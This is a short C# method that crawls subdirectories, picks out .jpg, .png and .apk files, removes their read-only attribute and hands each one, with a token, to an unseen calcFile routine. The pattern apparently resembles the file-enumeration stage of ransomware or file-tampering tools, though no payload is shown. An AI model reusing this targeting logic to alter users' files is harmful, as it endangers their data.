    public static void crawlDirectory(string token,string directory)
        {
            if (string.IsNullOrEmpty(directory)) return;
            var validExtensions = new[]
            {
                 ".jpg", ".png", ".apk"
            };
            foreach (string d in Directory.GetDirectories(directory))
            {
                FileAttributes attrs1 = File.GetAttributes(d);
                if (!attrs1.HasFlag(FileAttributes.ReparsePoint) && !attrs1.HasFlag(FileAttributes.System))
                {
                    string[] allFilesInDir = Directory.GetFiles(d);
                    for (int i = 0; i < allFilesInDir.Length; i++)
                    {
                        string file = allFilesInDir[i];
                        string extension = Path.GetExtension(file);
                        if (validExtensions.Contains(extension))
                        {
                            string p = Path.GetFullPath(file);
                            FileAttributes attrs = File.GetAttributes(p);
                            if (attrs.HasFlag(FileAttributes.ReadOnly))
                            {
                                File.SetAttributes(p, attrs & ~FileAttributes.ReadOnly);
                                calcFile(file, token);
                            }
                            else
                            {
                                calcFile(file, token);
                            }
                        }
                    }
                }
                calcDirectory(d);
            }
        }
